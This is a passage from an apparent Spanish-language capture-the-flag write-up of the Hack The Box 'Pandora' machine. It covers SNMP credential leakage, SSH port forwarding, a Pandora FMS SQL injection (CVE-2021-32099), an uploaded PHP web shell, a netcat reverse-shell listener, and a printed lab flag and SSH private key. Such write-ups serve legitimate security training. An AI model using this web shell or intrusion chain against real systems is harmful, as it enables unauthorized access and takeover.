+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (10) 0:00:00.10
+</code></pre></div></div>
+<ul>
+<li><p>Tenemos el nombre de un usuario el cual es Daniel.</p>
+</li>
+<li><p>Existe otra herramienta la cual funciona mucho mejor se llama <code>snmpbulkwalk</code>.</p>
+</li>
+<li><p>Podemos hacer lo mismo pero exportaremos todo a un <code>.txt</code> para simplemente <code>grepear</code> por Daniel para ver si vemos mas información.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content snmpbulkwalk -c public -v2c 10.10.11.136 &gt; snmp_enum.txt
+➜  content wc -l snmp_enum.txt
+6989 snmp_enum.txt
+</code></pre></div></div>
+<ul>
+<li>Vemos la contraseña del usuario Daniel.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content cat snmp_enum.txt | grep &quot;Daniel&quot; -i
+iso.3.6.1.2.1.1.4.0 = STRING: &quot;Daniel&quot;
+iso.3.6.1.2.1.25.4.2.1.5.840 = STRING: &quot;-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'&quot;
+iso.3.6.1.2.1.25.4.2.1.5.1102 = STRING: &quot;-u daniel -p HotelBabylon23&quot;
+</code></pre></div></div>
+<ul>
+<li><code>Daniel:HotelBabylon23</code>.</li>
+</ul>
+<h2 id="shell-as-daniel">Shell as daniel</h2>
+<ul>
+<li>Como el puerto 22 que corresponde a SSH esta abierto podemos conectarnos con las credenciales que encontramos enumerando por ese protocolo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content ssh daniel@10.10.11.136
+The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
+ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.136' (ED25519) to the list of known hosts.
+daniel@10.10.11.136's password:
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 19 Jun 19:35:55 UTC 2024
+
+  System load:           0.0
+  Usage of /:            63.5% of 4.87GB
+  Memory usage:          8%
+  Swap usage:            0%
+  Processes:             229
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.136
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:def7
+
+  =&gt; /boot is using 91.8% of 219MB
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+daniel@pandora:~$ export TERM=xterm
+</code></pre></div></div>
+<ul>
+<li>No tenemos ningún privilegio a nivel de <code>sudoers</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@pandora:~$ sudo -l
+[sudo] password for daniel:
+Sorry, user daniel may not run sudo on pandora.
+</code></pre></div></div>
+<ul>
+<li>Hay otro usuario el cual se llama <code>matt</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@pandora:~$ cd /home/
+daniel@pandora:/home$ ls
+daniel  matt
+daniel@pandora:/home$ cat /etc/passwd | grep sh
+root:x:0:0:root:/root:/bin/bash
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+matt:x:1000:1000:matt:/home/matt:/bin/bash
+daniel:x:1001:1001::/home/daniel:/bin/bash
+daniel@pandora:/home$
+</code></pre></div></div>
+<ul>
+<li>Necesitamos convertirnos en ese usuario para poder leer la <code>user.txt</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@pandora:/home/matt$ ls -l
+total 4
+-rw-r----- 1 root matt 33 Jun 19 18:56 user.txt
+daniel@pandora:/home/matt$ cat user.txt
+cat: user.txt: Permission denied
+</code></pre></div></div>
+<ul>
+<li>Vemos un <code>pandora_backup</code> además de tener el <code>pkexec</code> expuesto en esta ocasión no lo vamos a explotar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@pandora:/$ find \-perm -4000 2&gt;/dev/null
+./usr/bin/sudo
+./usr/bin/pkexec
+./usr/bin/chfn
+./usr/bin/newgrp
+./usr/bin/gpasswd
+./usr/bin/umount
+./usr/bin/pandora_backup
+./usr/bin/passwd
+./usr/bin/mount
+./usr/bin/su
+./usr/bin/at
+./usr/bin/fusermount
+./usr/bin/chsh
+./usr/lib/openssh/ssh-keysign
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/policykit-1/polkit-agent-helper-1
+</code></pre></div></div>
+<ul>
+<li>El grupo asignado es matt y el propietario es root.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@pandora:/$ ls -l ./usr/bin/pandora_backup
+-rwsr-x--- 1 root matt 16816 Dec  3  2021 ./usr/bin/pandora_backup
+</code></pre></div></div>
+<ul>
+<li>Tenemos que convertirnos en <code>matt</code> así que vamos ir a la ruta donde esta montana la pagina web.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@pandora:/var/www$ ls -l
+total 8
+drwxr-xr-x 3 root root 4096 Dec  7  2021 html
+drwxr-xr-x 3 matt matt 4096 Dec  7  2021 pandora
+daniel@pandora:/var/www$ cd pandora/
+daniel@pandora:/var/www/pandora$ ll
+total 16
+drwxr-xr-x  3 matt matt 4096 Dec  7  2021 ./
+drwxr-xr-x  4 root root 4096 Dec  7  2021 ../
+-rw-r--r--  1 matt matt   63 Jun 11  2021 index.html
+drwxr-xr-x 16 matt matt 4096 Dec  7  2021 pandora_console/
+</code></pre></div></div>
+<ul>
+<li>Vemos los archivos de configuración de Pandora <a href="https://pandorafms.com/es/">https://pandorafms.com/es/</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@pandora:/var/www/pandora$ cd pandora_console/
+daniel@pandora:/var/www/pandora/pandora_console$ ls
+ajax.php       COPYING               extras   index.php                         pandora_console_logrotate_suse    tests
+attachment     DB_Dockerfile         fonts    install.done                      pandora_console_logrotate_ubuntu  tools
+audit.log      DEBIAN                general  mobile                            pandora_console_upgrade           vendor
+AUTHORS        docker_entrypoint.sh  godmode  operation                         pandoradb_data.sql                ws.php
+composer.json  Dockerfile            images   pandora_console.log               pandoradb.sql
+composer.lock  extensions            include  pandora_console_logrotate_centos  pandora_websocket_engine.service
+</code></pre></div></div>
+<ul>
+<li>La web esta usando Apache2 al ir a su ruta hay un archivo el cual se llama <code>pandora.conf</code> que contiene un subdominio y lo esta corriendo el usuario <code>matt</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf
+&lt;VirtualHost localhost:80&gt;
+  ServerAdmin admin@panda.htb
+  ServerName pandora.panda.htb
+  DocumentRoot /var/www/pandora
+  AssignUserID matt matt
+  &lt;Directory /var/www/pandora&gt;
+    AllowOverride All
+  &lt;/Directory&gt;
+  ErrorLog /var/log/apache2/error.log
+  CustomLog /var/log/apache2/access.log combined
+&lt;/VirtualHost&gt;
+</code></pre></div></div>
+<ul>
+<li>Vamos agregarlo al <code>/etc/hosts</code> para ver si vemos algo diferente.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ echo &quot;10.10.11.136 pandora.panda.htb&quot; | sudo tee -a /etc/hosts
+10.10.11.136 pandora.panda.htb
+</code></pre></div></div>
+<ul>
+<li>Vemos lo mismo.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/2.png">
+</p>
+
+<ul>
+<li>Pero nos dice que se esta corriendo en el puerto 80 puede que externamente no lo veamos expuesto pero con esto podemos comprobar que si se esta corriendo y nos lleva ala ruta <code>/pandora_console</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">daniel@pandora:/etc/apache2/sites-enabled$ curl localhost
+&lt;meta HTTP-EQUIV=&quot;REFRESH&quot; content=&quot;0; url=/pandora_console/&quot;&gt;
+</code></pre></div></div>
+<h2 id="local-port-forwarding">Local Port Forwarding</h2>
+<ul>
+<li>Vamos a hacer un <code>Local Port Forwarding</code> para que el puerto <code>80</code> de la máquina sea nuestro puerto <code>80</code> y ver lo que esta corriendo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
+daniel@10.10.11.136's password:
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 19 Jun 19:52:31 UTC 2024
+
+  System load:           0.06
+  Usage of /:            63.5% of 4.87GB
+  Memory usage:          14%
+  Swap usage:            0%
+  Processes:             227
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.136
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:def7
+
+  =&gt; /boot is using 91.8% of 219MB
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Jun 19 19:35:56 2024 from 10.10.14.62
+daniel@pandora:~$
+</code></pre></div></div>
+<ul>
+<li>Comprobamos que todo este bien.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content lsof -i:80
+COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+ssh     19827 miguel    4u  IPv6  64194      0t0  TCP localhost:http (LISTEN)
+ssh     19827 miguel    5u  IPv4  64195      0t0  TCP localhost:http (LISTEN)
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/3.png">
+</p>
+
+<ul>
+<li>Abajo de la web tenemos la versión que esta corriendo pandora.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/4.png">
+</p>
+
+<h2 id="cve-2021-32099-unauthenticated-sql-injection">CVE-2021-32099 Unauthenticated SQL Injection</h2>
+<ul>
+<li><p>Como no tenemos credenciales encontramos que esta versión es vulnerable <a href="https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/">https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/</a>.</p>
+</li>
+<li><p>Esta es la ruta que nos dicen donde se aplica la SQL Injection.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/5.png">
+</p>
+
+<ul>
+<li>Podemos ocasionar un error.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/6.png">
+</p>
+
+<ul>
+<li>Al parecer existen demasiadas vulnerabilidades.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content searchsploit pandora
+-------------------------------------- ---------------------------------
+ Exploit Title                        |  Path
+-------------------------------------- ---------------------------------
+Pandora 7.0NG - Remote Code Execution | php/webapps/47898.py
+Pandora FMS - Ping Authenticated Remo | linux/remote/48334.rb
+Pandora Fms - Remote Code Execution ( | linux/remote/31518.rb
+Pandora Fms - SQL Injection Remote Co | php/remote/35380.rb
+Pandora FMS 3.1 - Authentication Bypa | php/remote/35731.rb
+Pandora FMS 3.1 - Authentication Bypa | php/webapps/15639.txt
+Pandora Fms 3.1 - Blind SQL Injection | php/webapps/15642.txt
+Pandora Fms 3.1 - Directory Traversal | php/webapps/15643.txt
+Pandora Fms 3.1 - OS Command Injectio | php/webapps/15640.txt
+Pandora Fms 3.1 - SQL Injection       | php/webapps/15641.txt
+Pandora Fms 3.2.1 - Cross-Site Reques | php/webapps/17524.html
+Pandora FMS 3.x - 'index.php' Cross-S | php/webapps/36073.txt
+Pandora FMS 4.0.1 - 'sec2' Local File | php/webapps/36792.txt
+Pandora Fms 4.0.1 - Local File Inclus | php/webapps/18494.txt
+Pandora FMS 5.0/5.1 - Authentication  | php/webapps/37255.txt
+Pandora Fms 5.0RC1 - Remote Command I | php/webapps/31436.txt
+Pandora FMS 5.1 SP1 - SQL Injection   | php/webapps/36055.txt
+Pandora FMS 7.0 NG 749 - 'CG Items' S | php/webapps/49046.txt
+Pandora FMS 7.0 NG 749 - Multiple Per | php/webapps/49139.txt
+Pandora FMS 7.0 NG 750 - 'Network Sca | php/webapps/49312.txt
+Pandora FMS 7.0NG - 'net_tools.php' R | php/webapps/48280.py
+Pandora FMS Monitoring Application 2. | php/webapps/10570.txt
+Pandora FMS v7.0NG.742 - Remote Code  | php/webapps/50961.py
+PANDORAFMS 7.0 - Authenticated Remote | php/webapps/48064.py
+PandoraFMS 7.0 NG 746 - Persistent Cr | php/webapps/48707.txt
+PandoraFMS NG747 7.0 - 'filename' Per | php/webapps/48700.txt
+-------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></div></div>
+<ul>
+<li>Buscando en GitHub encontramos este <code>exploit</code> en Python <a href="https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated">https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">wget https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py
+--2024-06-19 14:07:56--  https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6230 (6.1K) [text/plain]
+Saving to: ‘sqlpwn.py’
+
+sqlpwn.py                            100%[=====================================================================&gt;]   6.08K  --.-KB/s    in 0s
+
+2024-06-19 14:07:56 (43.8 MB/s) - ‘sqlpwn.py’ saved [6230/6230]
+</code></pre></div></div>
+<ul>
+<li>Si analizamos el <code>exploit</code> vemos que esta subiendo una <code>webshell</code> a una ruta lo cual esto ya es interesante ya que con esto sabemos que se pueden subir archivos pero supongo que eso es cuando ya estas dentro del panel de este servicio.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/7.png">
+</p>
+
+<ul>
+<li>Además las primeras líneas del <code>script</code> vemos que se esta empleando una cookie del usuario administrador la cual aun no tenemos vamos a copiarnos la inyección para ver que es lo que hace.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/8.png">
+</p>
+
+<ul>
+<li>No vemos nada.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/9.png">
+</p>
+
+<ul>
+<li>Pero bueno hay que recordar que con esta <code>query</code> le estamos robando la cookie al usuario administrador así que si esto funciono solo quitamos toda la <code>query</code> que metimos y listo estamos logueados.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/10.png">
+</p>
+
+<h2 id="shell-as-matt">Shell as matt</h2>
+<ul>
+<li>Aquí vemos una parte donde dice File Manager.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/11.png">
+</p>
+
+<ul>
+<li>Creamos un nuevo directorio.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/12.png">
+</p>
+
+<ul>
+<li>Vemos que esta en la ruta <code>images</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/13.png">
+</p>
+
+<ul>
+<li>Vamos a subir un <code>cmd.php</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">&lt;?php
+	echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
+?&gt;
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/14.png">
+</p>
+
+<ul>
+<li>Podemos ejecutar comandos.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/15.png">
+</p>
+
+<ul>
+<li>Vamos a ponernos en escucha.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content nc -nlvp 443
+listening on [any] 443 ...
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/pandora/16.png">
+</p>
+
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.62] from (UNKNOWN) [10.10.11.136] 39764
+bash: cannot set terminal process group (928): Inappropriate ioctl for device
+bash: no job control in this shell
+matt@pandora:/var/www/pandora/pandora_console/images/xd$ whoami
+whoami
+matt
+matt@pandora:/var/www/pandora/pandora_console/images/xd$
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:/var/www/pandora/pandora_console/images/xd$ script /dev/null -c bash
+&lt;pandora_console/images/xd$ script /dev/null -c bash
+Script started, file is /dev/null
+matt@pandora:/var/www/pandora/pandora_console/images/xd$ ^Z
+[1]  + 28851 suspended  nc -nlvp 443
+➜  content stty raw -echo; fg
+[1]  + 28851 continued  nc -nlvp 443
+                                    reset xterm
+&lt;ENTER&gt;
+matt@pandora:/var/www/pandora/pandora_console/images/xd$ export TERM=xterm
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li>Ya podemos ver la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:/home/matt$ cat user.txt
+3fb235f22fcbdf0957956bf99e229431
+</code></pre></div></div>
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+<ul>
+<li>Podemos conectarnos por SSH creándonos la clave id_rsa.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:/home/matt$ mkdir .ssh
+matt@pandora:/home/matt$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/matt/.ssh/id_rsa):
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/matt/.ssh/id_rsa
+Your public key has been saved in /home/matt/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:+4zYpQAjpjQhKRgfIQu5wj4JAjOycPSQ+hwVeIqBMBU matt@pandora
+The key's randomart image is:
++---[RSA 3072]----+
+|O+E=..           |
+|%B++o            |
+|@@.+.            |
+|@.+              |
+|==+.o   S        |
+|.*+. o   .       |
+|. .   . . .      |
+|       + *       |
+|      . + o      |
++----[SHA256]-----+
+matt@pandora:/home/matt$ cd .ssh/
+matt@pandora:/home/matt/.ssh$ ls
+id_rsa  id_rsa.pub
+matt@pandora:/home/matt/.ssh$ cat id_rsa.pub &gt; authorized_keys
+matt@pandora:/home/matt/.ssh$ chmod 600 authorized_keys
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">matt@pandora:/home/matt/.ssh$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAoPOuIm3w9hG+Cpj/5xA4L9ln/sFn78xiHzlx+ml/uh7zLEmL7d0o
+IMkIEWPIgbThYQF6ggwfHc1w2R/Et2jtyaEgZVfwkVILQgP7prZ34vHD43xpjGKUK/zkPf
+q1ICeyI922GXIbyeIFqKHrbUGsmiSVkLquGonK0sFYPgRsNIEb8u4GH7NiPly1eQ14JDYj
+XXY3uQ0K/xXIRdT/Y71YvtXIER9Gc9D5wESP4h+UAdG1SgCJEJmQA8suwJ9geWLRDPqikP
+E9cvMqQLHAByy/eR/RumMAdfq0TJ72lAUpVdnZ33epn8pRNFPkXB73aje+CH2y8yqZQ3DY
+T2jl0Z7wCSLlSjJl2VIC/b9hykNyZcjF3jQJerNQHYL5Ryz19ndU+oWRUBETrvzwjVD69h
+QUNu9Qi/xLr7FvBZLsLu6znL5nnZt72MWZI1u3bCPA02YWwEps9RFv1ZUTNDzHlGKqXA8h
+Mjxms8QsedURBlYDoPejrfXv1FDhTg47h9kn1dvvAAAFiO7SFu3u0hbtAAAAB3NzaC1yc2
+EAAAGBAKDzriJt8PYRvgqY/+cQOC/ZZ/7BZ+/MYh85cfppf7oe8yxJi+3dKCDJCBFjyIG0
+4WEBeoIMHx3NcNkfxLdo7cmhIGVX8JFSC0ID+6a2d+Lxw+N8aYxilCv85D36tSAnsiPdth
+lyG8niBaih621BrJoklZC6rhqJytLBWD4EbDSBG/LuBh+zYj5ctXkNeCQ2I112N7kNCv8V
+yEXU/2O9WL7VyBEfRnPQ+cBEj+IflAHRtUoAiRCZkAPLLsCfYHli0Qz6opDxPXLzKkCxwA
+csv3kf0bpjAHX6tEye9pQFKVXZ2d93qZ/KUTRT5Fwe92o3vgh9svMqmUNw2E9o5dGe8Aki
+5UoyZdlSAv2/YcpDcmXIxd40CXqzUB2C+Ucs9fZ3VPqFkVARE6788I1Q+vYUFDbvUIv8S6
++xbwWS7C7us5y+Z52be9jFmSNbt2wjwNNmFsBKbPURb9WVEzQ8x5RiqlwPITI8ZrPELHnV
+EQZWA6D3o63179RQ4U4OO4fZJ9Xb7wAAAAMBAAEAAAGBAJ+CoNMyThowXz01gHfI1UZmmf
+AaUR2QWrZDQjhAEfus7Ka5hNoJ0dkcIsjJMU+Kqcpvoq/7v2LT1cD5AQYcEX1AGFEXpC0B
+OHMGa4I/V/UsUUzEYf5lPB+UE8dxDcx+SsfM1MnHEs8zFxSW1DGFYr+o/ilfOWjHoqDYSN
+G9pFcslTxetOb56qWPT7JWrPiGRuo7XOIikQFY3xCGFU0NvEP0rsB5VGM3ei0YRdh+Hzrm
+UFq0ySIQbm+0D/OKgBwM1zrDWEcyjBQC7qXknSwSSL4G9oV7zldSmgPGuRt9MIu6AV26gL
+IuXhZ/Gp/879ycyIvcZrQ5jYHtbKock7/ypblHsqhtEg1WiD2fISLWnYiKYCTqvaBX2Z/7
+sOzqmBlNgUzgvgqiE4E1uS1RgbqJEj8BRv+jn6A/0KPfUMN+tmzKJ4ruyIqnVhb0BG0vl0
+eHixP4CH6saAZvz8rWJmBZk8ZCq0GkTQxkgvAZvKk+7T8xIdMh3CIXBqwS15yWX5EtYQAA
+AMB3basjLgKOqzyQR5HiavL8xwRpnSEpTl/kLW0axO2YwiJuPYO0rpQWbuIt5Uywi9TVte
